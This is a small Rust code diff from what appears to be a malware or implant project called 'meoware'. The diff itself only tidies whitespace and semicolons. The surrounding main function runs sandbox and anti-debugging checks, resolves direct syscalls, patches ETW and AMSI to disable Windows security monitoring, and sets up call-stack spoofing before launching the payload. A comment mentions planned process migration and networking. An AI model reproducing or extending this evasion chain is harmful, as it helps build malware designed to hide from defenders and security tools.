@@ -8,11 +8,11 @@ fn main() {
         if !ssn_table::initialize_syscalls(core::ptr::null_mut()) {
             return;
         }
-        
+
         if !sandbox::is_real_environment() {
             debug!("[SANDBOX] Environment check failed — aborting");
-            return
-        } 
+            return;
+        }
 
         if !anti_debug::is_safe_environment() {
             debug!("[ANIT] Environment check failed - aborting");
@@ -20,11 +20,10 @@ fn main() {
         }
 
         etw::patch_etw();
-        amsi::patch_amsi();  
+        amsi::patch_amsi();
         spoof::initialize_spoof_gadgets();
 
         // Skiping the networking for now, Ill do migration first
-        
 
         meoware::core::demo::demo();
     }
